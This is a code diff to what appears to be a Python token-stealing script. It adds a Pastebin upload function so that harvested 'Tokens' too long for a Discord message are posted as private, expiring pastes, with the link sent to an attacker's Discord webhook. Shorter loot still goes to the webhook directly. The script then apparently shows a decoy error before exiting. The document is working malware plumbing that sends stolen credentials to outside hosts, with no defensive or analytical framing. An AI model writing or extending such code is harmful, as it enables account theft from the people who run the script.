@@ -4,6 +4,26 @@ import requests as req
 from dhooks import Webhook
 
 Webhook_URL = ''
+Pastebin_KEY = ''
+
+
+def paste(msg):
+    data = {
+    'api_option': 'paste',
+    'api_dev_key': Pastebin_KEY,
+    'api_paste_code': msg,
+    'api_paste_name': 'Tokens',
+    'api_paste_expire_date': '1D',
+    'api_user_key': None,
+    'api_paste_private': 1
+    }
+
+    r = req.post("https://pastebin.com/api/api_post.php", data=data)
+
+    try:
+        return r.text
+    except:
+        return 0
 
 
 def error():
@@ -53,10 +73,19 @@ def main():
         except:
             pass
     
-    try:
+    if len(message) > 2000:
+        url = paste(message)
+        if url != 0:
+            try:
+                Webhook(Webhook_URL).send(url)
+            except:
+                pass
+        else:
+            Webhook(Webhook_URL).send('Paste failed somehow: trying regular upload:')
+            Webhook(Webhook_URL).send(message)
+    
+    else:
         Webhook(Webhook_URL).send(message)
-    except:
-        pass
 
     error()
     input("Press enter to exit")
